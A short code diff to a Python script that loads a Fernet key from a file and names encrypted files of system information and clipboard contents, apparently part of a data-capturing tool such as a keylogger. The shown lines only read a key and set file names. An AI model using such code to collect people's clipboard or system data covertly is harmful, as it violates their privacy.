@@ -1,10 +1,12 @@
-''' Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key. Fernet is an implementation of symmetric (also known as “secret key”) authenticated cryptography. '''
+''' Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key. Fernet is an implementation of symmetric (also known as "secret key") authenticated cryptography. '''
 
 from cryptography.fernet import Fernet
 
-''' Get key from the GenerateKey.py file '''
+''' Get key from the encryption_key.key file '''
 
-key = ""
+# Read the key from the key file
+with open("encryption_key.key", "rb") as key_file:
+    key = key_file.read()
 
 system_information_e = 'e_systeminfo.txt'
 clipboard_information_e = 'e_clipboard.txt'
